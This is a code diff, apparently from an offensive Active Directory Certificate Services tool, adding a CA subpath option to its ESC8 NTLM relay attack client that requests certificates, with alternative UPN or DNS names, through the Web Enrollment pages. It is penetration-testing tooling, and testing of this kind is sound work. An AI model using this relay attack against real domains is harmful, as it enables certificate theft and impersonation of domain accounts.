@@ -400,7 +400,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
     This class handles certificate operations via the Web Enrollment interface.
     """
 
-    def __init__(self, adcs_relay: "Relay", *args, **kwargs):  # type: ignore
+    def __init__(self, adcs_relay: "Relay", ca_subpath: "", *args, **kwargs):  # type: ignore
         """
         Initialize the HTTP attack client.
 
@@ -411,6 +411,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         """
         super().__init__(*args, **kwargs)
         self.adcs_relay = adcs_relay
+        self.ca_subpath = ca_subpath
 
     def run(self) -> None:  # type: ignore
         """
@@ -459,7 +460,9 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         """
 
         # Request the certificate request page
-        res = self.client.get("/certsrv/certrqxt.asp")
+        tmp_path = f"{self.ca_subpath}/" if self.ca_subpath else ""
+        res = self.client.get(f"/certsrv/{tmp_path}certrqxt.asp")
+
         content = res.text
 
         # Parse the HTML to extract templates
@@ -501,6 +504,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         result = web_retrieve(
             self.client,
             request_id,
+            self.ca_subpath or "",
         )
 
         if result is not None:
@@ -565,6 +569,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             csr,
             attributes,
             template,
+            self.ca_subpath or "",
             key,
             self.adcs_relay.out,
         )
@@ -790,6 +795,7 @@ class Relay:
         self,
         target: str,
         ca: Optional[str] = None,
+        ca_subpath: Optional[str] = None,
         template: Optional[str] = None,
         upn: Optional[str] = None,
         dns: Optional[str] = None,
@@ -816,6 +822,7 @@ class Relay:
         Args:
             target: Target AD CS server (http://server/certsrv/ or rpc://server)
             ca: Certificate Authority name (required for RPC)
+            ca-subpath: Path to ask certificate after /certsrv/
             template: Certificate template to request
             upn: Alternative UPN (User Principal Name)
             dns: Alternative DNS name
@@ -839,6 +846,7 @@ class Relay:
         self.target = target
         self.base_url = target  # Used only for HTTP(S) targets
         self.ca = ca
+        self.ca_subpath = ca_subpath
         self.template = template
         self.alt_upn = upn
         self.alt_dns = dns
@@ -870,6 +878,10 @@ class Relay:
         self.attacked_targets = []
         self.attack_lock = Lock()
 
+        # Parse the CA subpath
+        if self.ca_subpath is not None:
+            self.ca_subpath = self.ca_subpath.strip("/")
+
         # Configure target based on URL or RPC string
         if self.target.startswith("rpc://"):
             if ca is None:
@@ -883,14 +895,15 @@ class Relay:
                 "https://"
             ):
                 self.target = f"http://{self.target}"
-            if not self.target.endswith("/certsrv/certfnsh.asp"):
+            expected_path = f"/certsrv/{self.ca_subpath + '/' if self.ca_subpath else ''}certfnsh.asp"
+            if not self.target.endswith(expected_path):
                 if not self.target.endswith("/"):
                     self.target += "/"
 
                 if self.enum_templates:
-                    self.target += "certsrv/certrqxt.asp"
+                    self.target += f"certsrv/{(self.ca_subpath + '/') if self.ca_subpath else ''}certrqxt.asp"
                 else:
-                    self.target += "certsrv/certfnsh.asp"
+                    self.target += f"certsrv/{(self.ca_subpath + '/') if self.ca_subpath else ''}certfnsh.asp"
             logging.info(f"Targeting {self.target} (ESC8)")
 
             url = httpx.URL(self.target)
